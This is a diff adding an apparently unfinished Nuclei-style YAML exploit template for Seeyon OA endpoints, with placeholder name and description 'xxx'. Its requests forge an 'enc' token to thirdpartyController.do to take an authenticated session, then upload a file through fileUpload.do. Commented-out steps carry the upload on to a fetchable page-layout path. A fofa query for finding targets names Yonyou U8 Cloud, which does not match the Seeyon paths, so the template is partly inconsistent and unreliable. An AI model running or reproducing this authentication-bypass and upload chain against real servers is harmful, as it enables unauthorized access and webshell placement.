@@ -1,0 +1,114 @@
+id: session
+info:
+  name: xxx
+  author: mike
+  severity: info
+  description: xxx
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: app="用友-U8-Cloud"
+http:
+  - raw:
+      - |
+        POST /seeyon/thirdpartyController.do HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: python-requests/2.25.1
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Content-Length: 133
+        Content-Type: application/x-www-form-urlencoded
+
+        method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1
+
+      - |
+        POST /seeyon/fileUpload.do?method=processUpload&amp;maxSize HTTP/1.1
+        Content-Type: multipart/form-data; boundary=00content0boundary00
+        Cookie: JSESSIONID={{sessionid}}
+        User-Agent: Java/1.8.0_101
+        Host: {{Hostname}}
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Content-Length: 975
+        Connection: close
+
+        --00content0boundary00
+        Content-Disposition: form-data; name="type"
+
+
+        --00content0boundary00
+        Content-Disposition: form-data; name="extensions"
+
+
+        --00content0boundary00
+        Content-Disposition: form-data; name="applicationCategory"
+
+
+        --00content0boundary00
+        Content-Disposition: form-data; name="destDirectory"
+
+
+        --00content0boundary00
+        Content-Disposition: form-data; name="destFilename"
+
+
+        --00content0boundary00
+        Content-Disposition: form-data; name="maxSize"
+
+
+        --00content0boundary00
+        Content-Disposition: form-data; name="isEncrypt"
+
+
+        --00content0boundary00
+        Content-Disposition: form-data; name="file1"; filename="test.zip"
+        Content-Type: application/x-zip-compressed
+
+        --00content0boundary00--
+      
+      # - |
+      #   POST /seeyon/ajax.do HTTP/1.1
+      #   Cookie: JSESSIONID={{sessionid}}
+      #   Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+      #   User-Agent: Java/1.8.0_101
+      #   Host: {{Hostname}}
+      #   Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+      #   Content-Length: 142
+      #   Connection: close
+
+      #   method=ajaxAction&amp;managerName=portalDesignerManager&amp;managerMethod=uploadPageLayoutAttachment&amp;arguments=[0,"2023-11-16","-{{replace_regex(fileurls, "(\\D)", "")}}"]
+
+      # - |
+      #   GET /seeyon/common/designer/pageLayout/1.txt HTTP/1.1
+      #   Host: {{Hostname}}
+      #   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+      #   Accept-Encoding: gzip, deflate
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "fileurls=fileurls+"
+
+    extractors:
+      - type: regex # type of the extractor
+        part: header
+        name: sessionid
+        group: 1
+        internal: true # Required for using dynamic variables
+        regex:
+          - "JSESSIONID=(.*); Path=/seeyon"  # JQ like syntax for extraction
+      - type: regex # type of the extractor
+        part: body
+        name: fileurls
+        group: 1
+        internal: true # Required for using dynamic variables
+        regex:
+          - "fileurls=fileurls+(.*?);"  # JQ like syntax for extraction
+      
+      - type: dsl  # type of the extractor
+        dsl:
+          - sessionid # dsl expression value to extract from response
